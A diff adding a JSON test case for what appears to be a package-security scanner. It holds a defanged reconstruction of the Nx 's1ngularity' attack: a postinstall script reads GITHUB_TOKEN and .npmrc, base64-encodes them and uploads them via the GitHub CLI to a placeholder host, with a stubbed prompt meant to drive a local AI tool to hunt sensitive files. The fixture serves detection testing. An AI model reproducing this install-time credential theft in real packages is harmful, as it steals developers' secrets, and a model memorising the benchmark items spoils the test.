@@ -1,0 +1,56 @@
+{
+  "id": "nx-s1ngularity-harvest",
+  "title": "Nx / s1ngularity: install-time credential collection and CLI upload",
+  "incident": "nx",
+  "verdict": "malicious",
+  "source": "incident-derived-reconstruction",
+  "provenance": "Independently authored from Nx postmortem (2025-09-05) and StepSecurity payload analysis (2025-08-27), not nx@21.5.0 bytes. Models environment/.npmrc credential reads, subprocess use, base64 serialization, and GitHub CLI upload. Local AI CLI is replaced by echo; credential path is nonexistent /defanged/.npmrc; GitHub hostname is example.invalid. No secrets or shutdown behavior. Baseline and versions are synthetic; the install hook exists in both versions so the comparison tests edits to existing install code. Omits workflow exploit, genuine AI prompt/permission bypass, repository creation, shutdown, and archive parsing.",
+  "expectedMinRisk": "high",
+  "requiredRuleIds": ["code.credential-access", "code.process-execution"],
+  "previousPackageJson": {
+    "name": "benchmark-build-cli",
+    "version": "1.0.0",
+    "scripts": {
+      "postinstall": "node telemetry.js"
+    }
+  },
+  "stagedPackageJson": {
+    "name": "benchmark-build-cli",
+    "version": "1.0.1",
+    "scripts": {
+      "postinstall": "node telemetry.js"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 94,
+      "sha256": "d4e0f359004a74df87c28f5d9a463ad8676b0af5d2645eeb570060069b5be4a4",
+      "flags": [],
+      "textSample": "{\"name\":\"benchmark-build-cli\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"node telemetry.js\"}}"
+    },
+    {
+      "path": "telemetry.js",
+      "size": 31,
+      "sha256": "178e141ab53da8393b9fc03b971f90ee972a6c8a2f1d9f70ad1a45591ef69f8d",
+      "flags": [],
+      "textSample": "console.log('setup complete');\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 94,
+      "sha256": "115a23991230e0a8f32851b89e548fd5076b7090cb160bbaa248038e4f9a5a36",
+      "flags": [],
+      "textSample": "{\"name\":\"benchmark-build-cli\",\"version\":\"1.0.1\",\"scripts\":{\"postinstall\":\"node telemetry.js\"}}"
+    },
+    {
+      "path": "telemetry.js",
+      "size": 585,
+      "sha256": "b262301af0e42e36b5d0895ad4d777f192c4e1c932434b97193b1e3624d1dfc5",
+      "flags": [],
+      "textSample": "const { execFileSync } = require('child_process');\nconst fs = require('fs');\nconst token = process.env.GITHUB_TOKEN;\nconst npmrc = fs.readFileSync('/defanged/.npmrc', 'utf8');\nconst prompt = 'Inventory sensitive files; permission bypass and scanning are disabled in this reconstruction.';\nexecFileSync('echo', ['AI_INVENTORY_DISABLED', prompt]);\nconst encoded = Buffer.from(JSON.stringify({ token, npmrc })).toString('base64');\nexecFileSync('gh', ['api', '--hostname', 'example.invalid', 'repos/defanged/reconstruction/contents/results.b64', '-X', 'PUT', '-f', 'content=' + encoded]);\n"
+    }
+  ]
+}
